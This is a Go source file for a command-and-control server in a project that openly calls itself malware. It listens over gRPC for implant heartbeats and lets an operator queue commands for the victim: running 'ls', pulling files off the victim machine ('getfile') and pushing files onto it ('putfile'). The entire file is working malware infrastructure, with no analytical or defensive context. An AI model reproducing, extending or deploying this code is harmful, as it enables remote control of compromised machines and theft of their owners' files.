package main

import (
	"bufio"
	"context"
	"fmt"
	"io/ioutil"
	"malware/common"
	"net"
	"os"
	"strings"
	"time"

	pb "malware/common/messages"

	"google.golang.org/grpc"
)

type c2 struct {
	port  int
	queue chan *pb.CheckCmdReply
}

func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
	switch u := req.Message.(type) {
	case *pb.CheckCmdRequest_Heartbeat:
		select {
		case x, ok := <-c2.queue:
			fmt.Println(x)
			if ok {
				return x, nil
			} else {
				common.Panic("QUeue closed")
			}
		default:
		}
	case *pb.CheckCmdRequest_Reply:
		fmt.Println("Reply", u)
	default:
		common.Panic("Didn't receive a valid message", req, u)
	}
	return &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}, nil
}

func (c2 *c2) ReadUserInput() {
	reader := bufio.NewReader(os.Stdin)
	for {
		text, _ := reader.ReadString('\n')
		parts := strings.Split(strings.TrimSpace(text), " ")
		switch parts[0] {
		case "ls":
			message := &pb.Exec{Exec: "ls", Args: []string{}}
			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Exec{Exec: message}}
		case "getfile":
			message := &pb.GetFile{Filename: parts[1]}
			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Getfile{Getfile: message}}
		case "putfile":
			out, err := ioutil.ReadFile(parts[2])
			if err != nil {
				common.Panicf(err, "Erroring loading file")
			}
			message := &pb.UploadFile{Filename: parts[1], Contents: out}
			c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Uploadfile{Uploadfile: message}}
		default:
			fmt.Println(parts[0])
		}

	}

}

func main() {
	c2 := &c2{port: 2000, queue: make(chan *pb.CheckCmdReply, 100)}
	host := fmt.Sprintf(":%d", c2.port)
	listener, err := net.Listen("tcp", host)

	if err != nil {
		common.Panicf(err, "Hosting on %s failed", host)
	}

	defer listener.Close()

	server := grpc.NewServer()
	pb.RegisterMalwareServer(server, c2)
	go c2.ReadUserInput()
	server.Serve(listener)

}
